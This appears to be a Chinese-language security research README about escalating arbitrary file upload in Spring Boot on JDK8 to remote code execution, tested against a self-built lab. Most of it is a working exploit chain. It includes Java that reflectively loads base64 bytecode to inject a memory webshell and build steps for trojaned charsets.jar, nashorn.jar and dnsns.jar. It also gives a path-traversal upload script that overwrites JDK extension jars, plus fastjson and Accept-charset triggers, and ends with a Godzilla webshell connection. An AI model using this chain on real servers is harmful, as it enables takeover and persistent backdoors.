# Springboot任意文件写入RCE探索

SpringFileWriteRCE为漏洞环境，使用jdk8启动，包含upload, fastjson和aspectJ反序列化场景，启动服务前先创建uploads目录 mkdir /tmp/uploads

## charsets.jar

**概述**

原作者：https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks

改进：将IBM33722.java改为了字节码加载，可注入内存马

```java
package sun.nio.cs.ext;

import java.util.Base64;

public class IBM33722 {
    private static final String CLASS_BASE64 = "字节码";

    static {
        loadBytecode();
    }

    public IBM33722() {
        loadBytecode();
    }

    private static void loadBytecode() {
        try {
            byte[] classBytes = Base64.getDecoder().decode(CLASS_BASE64);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, int.class, int.class
            );
            defineClassMethod.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClassMethod.invoke(
                    Thread.currentThread().getContextClassLoader(),
                    classBytes, 0, classBytes.length
            );
            clazz.newInstance();

        } catch (Throwable t) {
        }
    }
}
```

**复现**

将漏洞环境打包好后进入容器启动项目

当前我的jdk路径：/usr/lib/jvm/jdk1.8.0_201/

<img width="1588" height="481" alt="image-20260115153911229" src="https://github.com/user-attachments/assets/d5c846ca-77a2-4478-b621-341b1a168a0f" />

先在容器下执行 mkdir /tmp/uploads

然后用upload.py上传提前打包好的charsets.jar文件

打包流程：

字节码可以用jmg生成，生成后粘贴到IBM33722.java，然后切到目录charsets\src，编译.java文件并打包

```
javac sun\nio\cs\ext\IBM33722.java
javac sun\nio\cs\ext\ExtendedCharsets.java
jar -cvf charsets.jar sun META-INF
```

上传后发送如下数据包触发恶意代码

```
GET / HTTP/1.1
Host: 192.168.239.139:8081
Accept: text/html;charset=GBK
```

<img width="1872" height="824" alt="image-20260115155047491" src="https://github.com/user-attachments/assets/77fb1515-f482-4f7a-940d-8278d2c75537" />

哥斯拉连接

<img width="612" height="644" alt="image-20260115155112622" src="https://github.com/user-attachments/assets/2ad270af-a061-404c-a8a1-0bbe11a23122" />

## nashorn.jar

**构造步骤**

1.备份并解压正常的nashorn.jar包，位于JAVA_HOME/jre/lib/ext/

2.在nashorn\jdk\nashorn\tools\下创建Shell.java，代码如下，这里就直接用这位师傅的代码来修改一下了

https://flowerwind.github.io/2025/02/28/%E5%88%86%E4%BA%AB%E4%B8%80%E6%AC%A1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8B%BF%E4%B8%8B%E7%9B%AE%E6%A0%87/

3.将fastjson-1.2.83.jar（可以根据目标环境来，不一定是1.2.83，不需要开启autotype）和正常的nashorn.jar包放在解压出来的nashorn目录下，用于编译Shell.java

```
nashorn
	--jdk
	--META-INF
	--fastjson-1.2.83.jar
	--nashorn.jar
```

4.编译Shell.java

windows

```cmd
javac -cp "fastjson-1.2.83.jar;nashorn.jar" jdk/nashorn/tools/Shell.java
```

linux

```bash
javac -cp "fastjson-1.2.83.jar:nashorn.jar" jdk/nashorn/tools/Shell.java
```

没有报错就算成功

5.将恶意Shell.class重新打包进nashorn.jar

```
jar -uvf nashorn.jar jdk/nashorn/tools/Shell.class
```

最后使用fastjson触发即可

```json
{"@type":"jdk.nashorn.tools.Shell","javaCode":"xxx"}
```

**实验**

docker启动服务

<img width="1589" height="514" alt="image" src="https://github.com/user-attachments/assets/07d2ff6e-db4c-41ef-a5b5-e7ff7e2c1423" />

用python上传恶意jar包，覆盖JAVA_HOME/jre/lib/ext/nashorn.jar

```python
import requests

url = "http://192.168.239.139:8081/upload"

#proxy = {'http': 'http://127.0.0.1:8080'}

target_path = "../../usr/lib/jvm/jdk1.8.0_201/jre/lib/ext/nashorn.jar"

with open(r"C:\Users\13903\Desktop\nashorn\nashorn.jar", "rb") as f:
    files = {
        'file': (target_path, f, 'application/octet-stream')
    }
    response = requests.post(url, files=files)

print(response.text)
```

上传成功后，访问/json

```
{"@type":"jdk.nashorn.tools.Shell","javaCode":"xxx"}
```

<img width="1873" height="822" alt="image" src="https://github.com/user-attachments/assets/bc40ec66-4ea6-42cc-9caf-792d9f0022da" />

哥斯拉连接

<img width="1055" height="683" alt="image" src="https://github.com/user-attachments/assets/be2918f0-8d96-4956-8f06-d9060b8658f6" />

## dnsns.jar

`dnsns.jar`也是位于jre/lib/ext路径下的文件，其核心原理与 `nashorn.jar` 类似：通过文件上传漏洞替换或污染这个扩展包中的类，再通过 Fastjson 反序列化触发该类的setter，从而实现 RCE。

由于利用方式相同，这里就不再过多赘述了，讲一下构造步骤即可

**构造步骤**

1.备份并解压正常的dnsns.jar包，位于JAVA_HOME/jre/lib/ext/

2.在dnsns\sun\net\spi\nameservice\dns\下创建DNSNameServiceDescriptor.java

3.将fastjson-1.2.83.jar和正常的dnsns.jar包放在解压出来的dnsns目录下，用于编译DNSNameServiceDescriptor.java

```
dnsns
	--sun
	--META-INF
	--fastjson-1.2.83.jar
	--dnsns.jar
```

4.编译DNSNameServiceDescriptor.java

```cmd
javac -cp "fastjson-1.2.83.jar" sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.java
```

5.将恶意Shell.class重新打包进dnsns.jar

```java
jar -uvf dnsns.jar sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.class
```

最后同样fastjson触发

```json
{"@type":"sun.net.spi.nameservice.dns.DNSNameServiceDescriptor","javaCode":"xxx"}
```
